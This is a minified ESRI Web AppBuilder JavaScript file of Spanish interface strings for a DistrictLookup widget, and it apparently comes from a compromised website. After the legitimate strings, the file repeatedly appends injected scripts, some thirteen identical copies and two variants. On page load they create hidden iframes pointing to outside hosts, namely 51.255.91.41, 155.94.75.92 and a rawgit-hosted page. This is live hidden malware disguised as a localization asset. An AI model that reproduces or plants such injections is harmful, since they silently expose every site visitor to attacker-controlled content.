// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Millas",kilometers:"Kil\u00f3metros",feet:"Pies",meters:"Metros"},layerSetting:{layerSettingTabTitle:"Configuraci\u00f3n de b\u00fasqueda",buttonSet:"Definir",selectLayersLabel:"Seleccionar capa",selectLayersHintText:"Sugerencia: se utiliza para seleccionar la capa del pol\u00edgono y su capa de puntos relacionada.",selectPrecinctSymbolLabel:"Seleccionar s\u00edmbolo para resaltar pol\u00edgono",selectGraphicLocationSymbol:"S\u00edmbolo de direcci\u00f3n o ubicaci\u00f3n",
graphicLocationSymbolHintText:"Sugerencia: s\u00edmbolo para la direcci\u00f3n buscada o para la ubicaci\u00f3n en la que se ha hecho clic",precinctSymbolHintText:"Sugerencia: se utiliza para visualizar el s\u00edmbolo para el pol\u00edgono seleccionado",selectColorForPoint:"Seleccionar color para resaltar el punto",selectColorForPointHintText:"Sugerencia: se utiliza para visualizar el color de resaltado para el punto seleccionado"},searchSourceSetting:{searchSourceSettingTabTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",
searchSourceSettingTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",searchSourceSettingTitleHintText:"Agrega y configura servicios de geocodificaci\u00f3n o capas de entidades como fuentes de b\u00fasqueda. Estas fuentes especificadas determinan qu\u00e9 se puede buscar en el cuadro de b\u00fasqueda",addSearchSourceLabel:"Agregar origen de b\u00fasqueda",featureLayerLabel:"Capa de entidades",geocoderLabel:"Geocodificador",nameTitle:"Nombre",generalSettingLabel:"Configuraci\u00f3n general",allPlaceholderLabel:"Texto del marcador de posici\u00f3n para buscar en todo:",
allPlaceholderHintText:"Sugerencia: escriba el texto que se va a mostrar como marcador de posici\u00f3n mientras busca todas las capas y el geocodificador",generalSettingCheckboxLabel:"Mostrar ventana emergente de la entidad o la ubicaci\u00f3n encontrada",countryCode:"C\u00f3digo(s) de pa\u00eds o regi\u00f3n",countryCodeEg:"p. ej., ",countryCodeHint:"Si se deja este valor en blanco, se buscar\u00e1 en todos los pa\u00edses y regiones",questionMark:"?",searchInCurrentMapExtent:"Buscar solo en la extensi\u00f3n de mapa actual",
zoomScale:"Aplicar zoom a escala",locatorUrl:"Direcci\u00f3n URL del geocodificador",locatorName:"Nombre del geocodificador",locatorExample:"Ejemplo",locatorWarning:"No se admite esta versi\u00f3n del servicio de geocodificaci\u00f3n. El widget admite servicios de geocodificaci\u00f3n 10.0 y superiores.",locatorTips:"No hay sugerencias disponibles porque el servicio de geocodificaci\u00f3n no admite la opci\u00f3n de sugerencias.",layerSource:"Origen de capa",setLayerSource:"Establecer origen de capa",
setGeocoderURL:"Establecer direcci\u00f3n URL de geocodificador",searchLayerTips:"No hay sugerencias disponibles porque el servicio de entidades no admite la opci\u00f3n de paginaci\u00f3n.",placeholder:"Texto del marcador de posici\u00f3n",searchFields:"Campos de b\u00fasqueda",displayField:"Mostrar campo",exactMatch:"Coincidencia exacta",maxSuggestions:"M\u00e1ximo de sugerencias",maxResults:"Resultados m\u00e1ximos",enableLocalSearch:"Habilitar b\u00fasqueda local",minScale:"Escala M\u00ednima",
minScaleHint:"Si la escala del mapa es mayor que esta escala, se aplicar\u00e1 la b\u00fasqueda local",radius:"Radio",radiusHint:"Permite especificar el radio de un \u00e1rea alrededor del centro del mapa actual que se utilizar\u00e1 para mejorar la clasificaci\u00f3n de los candidatos de geocodificaci\u00f3n a fin de que se devuelvan primero aquellos m\u00e1s cercanos a la ubicaci\u00f3n",meters:"Metros",setSearchFields:"Establecer campos de b\u00fasqueda",set:"Definir",fieldName:"Nombre",invalidUrlTip:"No se puede acceder a la direcci\u00f3n URL ${URL} o bien no es v\u00e1lida.",
invalidSearchSources:"Configuraci\u00f3n de fuente de b\u00fasqueda no v\u00e1lida"},layerSelector:{selectPolygonLayerLabel:"Seleccionar capa de pol\u00edgono",selectPolygonLayerHintText:"Sugerencia: se utiliza para seleccionar la capa del pol\u00edgono.",selectRelatedPointLayerLabel:"Seleccionar capa de puntos relacionada con capa de pol\u00edgono",selectRelatedPointLayerHintText:"Sugerencia: se utiliza para seleccionar la capa de puntos relacionada con la capa de pol\u00edgono",polygonLayerNotHavingRelatedLayer:"Selecciona una capa de pol\u00edgono que tenga una capa de puntos relacionada.",
errorInSelectingPolygonLayer:"Selecciona una capa de pol\u00edgono que tenga una capa de puntos relacionada.",errorInSelectingRelatedLayer:"Selecciona una capa de puntos relacionada con la capa de pol\u00edgono."},routeSetting:{routeSettingTabTitle:"Configuraciones de indicaciones",routeServiceUrl:"Servicio de generaci\u00f3n de rutas",buttonSet:"Definir",routeServiceUrlHintText:"Sugerencia: haz clic en \u2018Definir\u2019 para examinar y seleccionar un servicio de generaci\u00f3n de rutas para el an\u00e1lisis de red",
directionLengthUnit:"Unidades de longitud de direcci\u00f3n",unitsForRouteHintText:"Sugerencia: se utiliza para visualizar las unidades indicadas para la ruta",selectRouteSymbol:"Seleccionar s\u00edmbolo para visualizar ruta",routeSymbolHintText:"Sugerencia: se utiliza para visualizar el s\u00edmbolo de l\u00ednea de la ruta",routingDisabledMsg:"Para habilitar las indicaciones, aseg\u00farate de que la generaci\u00f3n de rutas est\u00e1 habilitada en el elemento de ArcGIS Online."},networkServiceChooser:{arcgislabel:"Agregar desde ArcGIS Online",
serviceURLabel:"Agregar URL de servicio",routeURL:"URL de ruta",validateRouteURL:"Validar",exampleText:"Ejemplo",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Especifica un servicio de rutas v\u00e1lido.",rateLimitExceeded:"Se ha superado el l\u00edmite de velocidad. Vuelva a intentarlo m\u00e1s tarde.",errorInvokingService:"El nombre de usuario o la contrase\u00f1a son incorrectos."},
symbolPickerPreviewText:"Vista previa:",showToolToSelectLabel:"Seleccionar bot\u00f3n de ubicaci\u00f3n",showToolToSelectHintText:"Sugerencia: proporciona un bot\u00f3n para establecer una ubicaci\u00f3n en el mapa en vez de establecer siempre la ubicaci\u00f3n cuando se ha hecho clic en el mapa",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});